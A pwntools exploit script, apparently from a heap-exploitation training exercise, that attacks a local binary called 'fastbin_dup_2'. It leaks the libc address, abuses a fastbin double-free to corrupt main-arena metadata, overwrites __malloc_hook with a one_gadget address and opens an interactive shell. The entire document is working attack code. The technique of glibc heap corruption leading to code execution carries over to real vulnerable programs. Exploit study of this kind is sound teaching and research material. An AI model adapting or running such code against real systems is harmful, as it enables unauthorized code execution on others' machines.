#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Below 0x58, and from 0x69 to 0x78
# We cannot from 0x58 to 0x68 included
# Request two 0x30-sized chunks and fill them with data.

io.info(f'libc at {hex(libc.address)}')
target060_arena = libc.address + 0x3b4b88
malloc_hook = libc.address + 0x3b4b50

# Place 0x80 in fastbin 0x60 pointer in arena
io.info("Place '0x80' in 0x60 fastbin pointer in arena")
chunk_A = malloc(0x58, b"A"*0x58)
chunk_B = malloc(0x58, b"B"*0x58)

free(chunk_A)
free(chunk_B)
free(chunk_A)

malloc(0x58, p64(0x80))
malloc(0x58, b"C"*0x58)
malloc(0x58, b"D"*0x58)

io.info("Move top_chunk to __malloc_hook - 0x24 by allocating a 0x80 fastbin in the arena metadata")

chunk_A = malloc(0x78, b"E"*0x78)
chunk_B = malloc(0x78, b"F"*0x78)

free(chunk_A)
free(chunk_B)
free(chunk_A)


# For the one_gadget to work, we need to have valid arguments for rsp+0x50 -- using -l
malloc(0x78, p64(target060_arena))
malloc(0x78, b"-l\x00" + b"X"*0x75)
malloc(0x78, b"-l\x00" + b"X"*0x75)
malloc(0x78, b"-l\x00" + b'O' * 0x25 + p64(malloc_hook-0x24))

io.info(f"Write one_gadget address {libc.address + 0xe1fa1:02x} into __malloc_hook ")
malloc(0x30, b"-l\x00" + b'A' * 0x11 + p64(libc.address + 0xe1fa1))

io.info('Triggering __malloc_hook')
malloc(1, b'')
# malloc_hook = 0x7ffff7bb4b50
# potential_target = 0x7ffff7bb4b2d
# diff = malloc_hook - potential_target

#chunk_exploit = malloc(0x68, b"E" * 19 + p64(libc.address + 0xe1fa1))

# =============================================================================

io.info('Shell ready; have fun :)')
io.info('Executing whoami')
io.sendline(b'whoami')
io.interactive()
